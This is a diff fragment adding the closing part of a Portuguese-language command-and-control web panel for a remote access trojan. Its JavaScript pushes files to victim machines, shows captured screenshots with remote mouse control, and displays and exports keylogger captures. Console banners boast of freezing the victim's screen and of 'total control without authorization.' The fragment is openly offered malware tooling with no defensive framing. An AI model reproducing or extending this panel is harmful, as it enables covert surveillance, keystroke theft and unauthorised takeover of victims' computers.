+function uploadFile() { const input = document.createElement('input'); input.type = 'file'; input.onchange = (e) => { const file = e.target.files[0]; const reader = new FileReader(); reader.onload = (ev) => { const b64 = btoa(ev.target.result); sendRATCommand('upload_file', JSON.stringify({ path: document.getElementById('filePath').value || 'uploaded', data: b64 })); }; reader.readAsBinaryString(file); }; input.click(); }
+
+// ============================================================
+// UI FUNCTIONS
+// ============================================================
+function switchTab(tabId) {
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
+    document.querySelectorAll('.panel').forEach(panel => panel.classList.remove('active-panel'));
+    document.getElementById(tabId).classList.add('active-panel');
+}
+
+function showScreenshot(imageData) { 
+    document.getElementById('screen').innerHTML = `<img src="data:image/png;base64,${imageData}" class="screenshot-img" id="liveScreen"><p>Screenshot capturada - Modo controle ativo</p>`;
+    if (isControlling) enableMouseControl();
+}
+
+function addToKeylogger(text) { const display = document.getElementById('keyloggerDisplay'); display.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${text}</div>`; display.scrollTop = display.scrollHeight; }
+function clearKeylogger() { document.getElementById('keyloggerDisplay').innerHTML = ''; addToKeylogger('Histórico limpo'); }
+function exportKeylogger() { const content = document.getElementById('keyloggerDisplay').innerText; const blob = new Blob([content], {type:'text/plain'}); const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `keylog_${Date.now()}.txt`; a.click(); }
+function addToTerminal(text) { const output = document.getElementById('terminalOutput'); output.innerHTML += `<div class="terminal-line">${text}</div>`; output.scrollTop = output.scrollHeight; }
+function showNotification(msg, type) { const n = document.getElementById('notification'); n.style.background = type === 'error' ? '#ff004022' : '#00ff9922'; n.style.borderLeft = `3px solid ${type === 'error' ? '#ff0040' : '#00ff99'}`; n.innerHTML = `<i class="fas fa-${type === 'error' ? 'exclamation-triangle' : 'info-circle'}"></i> ${msg}`; n.style.display = 'block'; setTimeout(() => n.style.display = 'none', 3000); }
+function logout() { localStorage.removeItem('c2_user'); localStorage.removeItem('c2_api_key'); if(ws) ws.close(); window.location.href = '/login.html'; }
+
+// ============================================================
+// INICIALIZAR
+// ============================================================
+loadUserData();
+console.log('%c⚠️ C2 PANEL ULTIMATE - CONTROLE TOTAL ATIVO ⚠️', 'color: #00ff99; font-size: 14px; font-weight: bold;');
+console.log('%c✅ FREEZE SCREEN: Congela a tela da vítima', 'color: #00ced1; font-size: 12px;');
+console.log('%c✅ CONTROLE NÃO SUPERVISIONADO: Controle total sem autorização', 'color: #ff69b4; font-size: 12px;');
+</script>
+</body>
+</html>
